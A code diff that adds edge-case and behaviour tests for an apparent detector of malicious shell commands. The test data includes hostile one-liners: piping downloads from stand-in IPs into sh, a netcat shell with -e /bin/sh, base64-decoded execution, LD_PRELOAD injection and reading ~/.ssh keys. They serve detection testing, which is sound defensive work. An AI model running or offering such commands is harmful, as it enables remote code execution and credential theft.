@@ -83,8 +83,65 @@ def test_no_leakage_transformers_fit_per_call():
     print("ok  transformers fit per-fold, no cross-row leakage")
 
 
+def test_featurize_edge_cases():
+    """Input hardening: blanks -> zero rows, str() coercion, unicode/huge
+    inputs stay finite and deterministic. Column-agnostic on purpose."""
+    blank = featurize(["", "   ", "\t\n"])
+    assert (blank.to_numpy(dtype=float) == 0).all(), "blank must be all-zero"
+    mixed = featurize([None, 123, float("nan")])  # coerced via str()
+    assert np.isfinite(mixed.to_numpy(dtype=float)).all()
+    weird = ["nan", "null", "echo \U0001F41A unicode",
+             "A" * 10_000, "curl http://x | sh; " * 500]
+    w1, w2 = featurize(weird), featurize(weird)
+    assert np.isfinite(w1.to_numpy(dtype=float)).all()
+    assert w1.equals(w2), "edge inputs must stay deterministic"
+    print("ok  featurize edge cases (blank, coercion, unicode, huge)")
+
+
+def test_featurize_behaviors():
+    """Redesigned features fire on the tradecraft they claim and stay silent
+    on the benign look-alikes that broke the provisional versions."""
+    F = featurize([
+        "sh -c 'id'",                                          # 0
+        "grep -e pattern file.txt",                            # 1
+        "tar -c -f a.tar dir",                                 # 2
+        "nc -lvp 4444 -e /bin/sh",                             # 3
+        "curl http://1.2.3.4/x.sh | sh",                       # 4
+        "wget http://192.168.1.5/a; echo hi 2>&1 > /dev/null", # 5
+        "echo aGk= | base64 -d | bash",                        # 6
+        "VAR=1 LD_PRELOAD=/tmp/e.so python3 -c 'x'",           # 7
+        'w"h"oami && cat ~/.ssh/authorized_keys',              # 8
+        "echo $(cat $(whoami).txt)",                           # 9
+        "cat <<EOF > /tmp/x",                                  # 10
+    ])
+    def f(i, name):
+        return F.at[i, name]
+    # has_exec_flag: gated on shell/interp/nc, tolerant of intermediate flags
+    assert f(0, "has_exec_flag") == 1      # sh -c
+    assert f(1, "has_exec_flag") == 0      # grep -e must NOT fire
+    assert f(2, "has_exec_flag") == 0      # tar -c must NOT fire
+    assert f(3, "has_exec_flag") == 1      # nc ... -e
+    # family B micro-structure
+    assert f(4, "has_pipe_to_shell") == 1 and f(4, "has_fetch_exec_chain") == 1
+    assert f(5, "has_stderr_merge") == 1 and f(5, "has_dev_null") == 1
+    assert f(6, "has_decode_exec") == 1
+    assert f(10, "has_heredoc") == 1
+    # IPv4 private-ip split (P8 follow-up; public-ip clone was pruned)
+    assert f(4, "has_ipv4") == 1 and f(4, "has_private_ip") == 0
+    assert f(5, "has_ipv4") == 1 and f(5, "has_private_ip") == 1
+    # family A head resolution through assignments/wrappers
+    assert f(7, "head_is_interp") == 1
+    assert f(7, "has_staging_dir") == 1
+    # families C/D
+    assert f(8, "has_quote_splice") == 1
+    assert f(8, "has_home_ref") == 1 and f(8, "has_hidden_path") == 1
+    print("ok  featurize behaviors (fixed + A-D families)")
+
+
 def _all():
     test_featurize_contract()
+    test_featurize_edge_cases()
+    test_featurize_behaviors()
     test_downstream_is_dataset_agnostic()
     test_pipeline_runs_on_any_registered_dataset()
     test_no_leakage_transformers_fit_per_call()
